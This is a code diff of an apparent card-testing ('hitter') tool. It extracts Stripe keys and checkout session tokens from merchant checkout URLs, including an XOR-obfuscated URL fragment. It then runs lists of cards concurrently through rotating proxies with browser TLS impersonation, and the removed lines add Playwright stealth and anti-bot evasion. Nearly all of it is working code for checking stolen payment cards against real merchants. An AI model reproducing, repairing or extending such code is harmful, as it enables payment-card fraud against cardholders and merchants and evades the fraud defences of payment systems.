-        result['decline_code'] = 'exception'
-        result['response_time'] = time.time() - start
-    finally:
-        if context:
-            try: await asyncio.wait_for(context.close(), timeout=2.0)
-            except: pass
-    return result
-
 class StripeAPIHitter:
     def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict = None):
         self.pk_live = pk_live
@@ -1689,7 +876,7 @@ class StripeAPIHitter:
         return result
 
 class ConcurrentHitter:
-    def __init__(self, user_id: int, url: str, cards: List[Dict], update_callback=None):
+    def __init__(self, user_id: int, url: str, cards: list, update_callback=None):
         self.user_id = user_id
         self.url = url
         self.cards = cards
@@ -1698,125 +885,64 @@ class ConcurrentHitter:
         self.completed = 0
         self.total = len(cards[:MAX_ATTEMPTS])
         self.url_info = None
-        self.autofill_class = None
         self.update_callback = update_callback
         self.is_running = True
         
-    async def analyze_first(self, browser):
-        # 1% CODER: FAST PATH! Bypass Playwright completely for native Stripe endpoints using curl_cffi TLS impersonation
+    async def analyze_first(self):
         url_lower = self.url.lower()
-        if any(x in url_lower for x in ['checkout.stripe.com', 'buy.stripe.com', 'invoice.stripe.com']):
-            for _ in range(3):
-                try:
-                    proxy_data = await ProxyManager.get_random(self.user_id)
-                    proxies = None
-                    if proxy_data:
-                        auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
-                        proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
-                        proxies = {"http": proxy_url, "https": proxy_url}
-                    
-                    if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fast-analyzing Stripe endpoint..."})
-                    
-                    async with cffi_requests.AsyncSession(impersonate="chrome120", proxies=proxies) as s:
-                        resp = await s.get(self.url, timeout=10)
-                        html = resp.text
-                        
-                        self.autofill_class = StripeV4_Invoice if 'invoice.stripe.com' in url_lower else StripeV2_ElementsIframe
-                        cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
-                        
-                        pk_key = None
-                        hash_idx = self.url.find('#')
-                        if hash_idx != -1:
-                            import urllib.parse, base64, json
-                            hash_str = self.url[hash_idx+1:]
-                            decoded = urllib.parse.unquote(hash_str)
-                            try:
-                                raw_bytes = base64.b64decode(decoded + '==')
-                                json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
-                                data = json.loads(json_str)
-                                pk_key = data.get('apiKey')
-                            except: pass
-                        if not pk_key:
-                            pk_key = StripeAPIExtractor.extract_pk_live(html)
-                            
-                        self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None}
-                        
-                        if cs_token and pk_key:
-                            api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
-                            if api_data.get('success'):
-                                self.url_info['amount'] = api_data.get('amount')
-                                self.url_info['merchant'] = api_data.get('merchant')
-                        return # Fast path successful, abort Playwright analyzer
-                except Exception as e:
-                    continue # Try next proxy
-                    
-        # Fallback: Playwright analyzer for all other gateways
-        max_retries = 3 # Increased to 3 so a single bad proxy doesn't abort the session
-        for attempt in range(max_retries):
-            context = None
+        if not any(x in url_lower for x in ['checkout.stripe.com', 'buy.stripe.com', 'invoice.stripe.com']):
+            if self.update_callback:
+                await self.update_callback({"status": "error", "error": "Only native Stripe checkout URLs are currently supported."})
+            return False
+            
+        for _ in range(3):
             try:
                 proxy_data = await ProxyManager.get_random(self.user_id)
-                playwright_proxy = ProxyManager.format_for_playwright(proxy_data) if proxy_data else None
-                
-                if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Testing proxy connection..."})
-                
-                # 1% CODER: Wrap context creation to prevent deadlocks
-                context = await asyncio.wait_for(browser.new_context(
-                    proxy=playwright_proxy,
-                    ignore_https_errors=True
-                ), timeout=5.0)
-                
-                page = await context.new_page()
-                
-                # 1% CODER: Apply Stealth even to the initial analyzer to avoid Cloudflare taint
-                await Stealth().apply_stealth_async(page)
-                
-                if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Analyzing Stripe endpoint..."})
-                
-                # 1% CODER: Wrap with asyncio.wait_for to prevent native Playwright network deadlocks
-                try:
-                    await asyncio.wait_for(page.goto(self.url, timeout=15000, wait_until='domcontentloaded'), timeout=16.0)
-                except asyncio.TimeoutError:
-                    raise Exception("Timeout 15000ms exceeded.")
-                await asyncio.sleep(2)
-                try:
-                    self.url_info = await asyncio.wait_for(URLAnalyzer.analyze(self.user_id, page, self.url), timeout=5.0)
-                except Exception as ex:
-                    print(f"DEBUG: URLAnalyzer failed/timed out: {ex}")
-                    self.url_info = {'merchant': 'Unknown', 'amount': None, 'cs_token': None, 'pk_key': None}
-                
-                if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Detecting gateway engine..."})
-                
-                try:
-                    self.autofill_class = await asyncio.wait_for(AutofillSelector.detect(page, self.url), timeout=5.0)
-                except Exception as ex:
-                    print(f"DEBUG: AutofillSelector failed/timed out: {ex}")
-                    self.autofill_class = None
-                
-                try: await asyncio.wait_for(context.close(), timeout=2.0)
-                except: pass
-                break # Success!
-            except Exception as e:
-                err_str = str(e)
-                print(f"DEBUG: analyze_first() attempt {attempt} failed: {err_str}")
-                should_remove = False
+                proxies = None
                 if proxy_data:
-                    if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
-                        should_remove = True
+                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
+                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                    proxies = {"http": proxy_url, "https": proxy_url}
+                
+                if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fast-analyzing Stripe endpoint..."})
+                
+                async with cffi_requests.AsyncSession(impersonate="chrome120", proxies=proxies) as s:
+                    resp = await s.get(self.url, timeout=10)
+                    html = resp.text
+                    
+                    cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
+                    
+                    pk_key = None
+                    hash_idx = self.url.find('#')
+                    if hash_idx != -1:
+                        import urllib.parse, base64, json
+                        hash_str = self.url[hash_idx+1:]
+                        decoded = urllib.parse.unquote(hash_str)
+                        try:
+                            raw_bytes = base64.b64decode(decoded + '==')
+                            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
+                            data = json.loads(json_str)
+                            pk_key = data.get('apiKey')
+                        except: pass
+                    if not pk_key:
+                        pk_key = StripeAPIExtractor.extract_pk_live(html)
                         
-                if should_remove:
-                    # DEBUG: Temporarily disable auto-delete
-                    # await ProxyManager.remove(self.user_id, proxy_data['raw'])
-                    pass
-                if context:
-                    try: await asyncio.wait_for(context.close(), timeout=2.0)
-                    except: pass
-                if attempt == max_retries - 1:
-                    self.url_info = {'amount': None, 'merchant': 'Unknown'} # Fallback
-        
-        return self.url_info
+                    self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None}
+                    
+                    if cs_token and pk_key:
+                        api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
+                        if api_data.get('success'):
+                            self.url_info['amount'] = api_data.get('amount')
+                            self.url_info['merchant'] = api_data.get('merchant')
+                    return True
+            except Exception as e:
+                continue
+                
+        if self.update_callback:
+            await self.update_callback({"status": "error", "error": "Failed to analyze Stripe endpoint. Proxies might be dead."})
+        return False
 
-    async def _worker(self, queue: asyncio.Queue, browser, autofill_class):
+    async def _worker(self, queue: asyncio.Queue):
         while self.is_running:
             try:
                 card, attempt_num = queue.get_nowait()
@@ -1824,18 +950,14 @@ class ConcurrentHitter:
                 break
                 
             try:
-                max_retries = 2 # Reduced to 2 to fail fast and prevent 4+ minute hangs
+                max_retries = 2
                 for try_idx in range(max_retries):
-                    if self.url_info and self.url_info.get('cs_token') and self.url_info.get('pk_key'):
-                        proxy_data = await ProxyManager.get_random(self.user_id)
-                        hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data)
-                        result = await hitter.hit(card, attempt_num, self.user_id)
-                        result['amount'] = self.url_info.get('amount')
-                        result['merchant'] = self.url_info.get('merchant')
-                    else:
-                        result = await single_hit(browser, self.url, card, attempt_num, autofill_class, self.url_info, self.user_id)
+                    proxy_data = await ProxyManager.get_random(self.user_id)
+                    hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data)
+                    result = await hitter.hit(card, attempt_num, self.user_id)
+                    result['amount'] = self.url_info.get('amount')
+                    result['merchant'] = self.url_info.get('merchant')
                     
-                    # Retry if proxy failed/timeout
                     err_str = result.get('error', '')
                     should_retry = False
                     if result.get('decline_code') == 'exception':
@@ -1843,16 +965,10 @@ class ConcurrentHitter:
                             should_retry = True
                             
                     if should_retry:
-                        if result.get('proxy_raw'):
-                            # DEBUG: Temporarily disable auto-delete
-                            # await ProxyManager.remove(self.user_id, result['proxy_raw'])
-                            pass
-                            
                         if try_idx < max_retries - 1:
-                            # 1% CODER: Exponential Backoff (from claude.py) for rate limit / proxy drops
                             delay = 2.0 * (try_idx + 1)
                             await asyncio.sleep(delay)
-                            continue # Try again with a new proxy
+                            continue
                     break
                 
                 self.completed += 1
@@ -1876,51 +992,30 @@ class ConcurrentHitter:
                 queue.task_done()
     
     async def run(self):
-        try:
-            if self.update_callback:
-                await self.update_callback({"status": "analyzing"})
-                
-            async with async_playwright() as p:
-                # 1% CODER: Launch Chromium once to prevent RAM exhaust on 512MB VMs
-                browser = await p.chromium.launch(headless=True, args=[
-                    '--disable-blink-features=AutomationControlled',
-                    '--no-sandbox',
-                    '--disable-dev-shm-usage',
-                    '--disable-web-security',
-                    '--disable-site-isolation-trials',
-                    '--ignore-certificate-errors', # Crucial for some proxy providers
-                    '--proxy-bypass-list=<-loopback>' # Prevent localhost proxy loops
-                ])
-                
-                await self.analyze_first(browser)
-                
-                autofill_class = self.autofill_class
-                if not autofill_class:
-                    if self.update_callback:
-                        await self.update_callback({"status": "error", "error": "Failed to analyze gateway engine. The site is dead or heavily protected."})
-                    return
-                
-                if self.update_callback:
-                    await self.update_callback({"status": "starting", "url_info": self.url_info, "autofill": autofill_class.__name__})
-                    
-                queue = asyncio.Queue()
-                for i, card in enumerate(self.cards[:MAX_ATTEMPTS]):
-                    queue.put_nowait((card, i + 1))
-                    
-                workers = []
-                for _ in range(CONCURRENT_BATCH_SIZE):
-                    workers.append(asyncio.create_task(self._worker(queue, browser, autofill_class)))
-                    
-                await queue.join()
-                
-                for w in workers:
-                    w.cancel()
-                    
-                try: await asyncio.wait_for(browser.close(), timeout=5.0)
-                except: pass
-                
-            if self.update_callback:
-                await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
-        except Exception as e:
-            if self.update_callback:
-                await self.update_callback({"status": "error", "error": str(e)})
+        if self.update_callback:
+            await self.update_callback({"status": "starting"})
+            
+        success = await self.analyze_first()
+        if not success:
+            return
+            
+        if self.update_callback:
+            await self.update_callback({"status": "starting", "url_info": self.url_info})
+            
+        import asyncio
+        queue = asyncio.Queue()
+        for idx, card in enumerate(self.cards[:MAX_ATTEMPTS]):
+            queue.put_nowait((card, idx+1))
+            
+        workers = []
+        for _ in range(min(CONCURRENT_BATCH_SIZE, len(self.cards))):
+            task = asyncio.create_task(self._worker(queue))
+            workers.append(task)
+            
+        await queue.join()
+        
+        for w in workers:
+            w.cancel()
+            
+        if self.update_callback:
+            await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
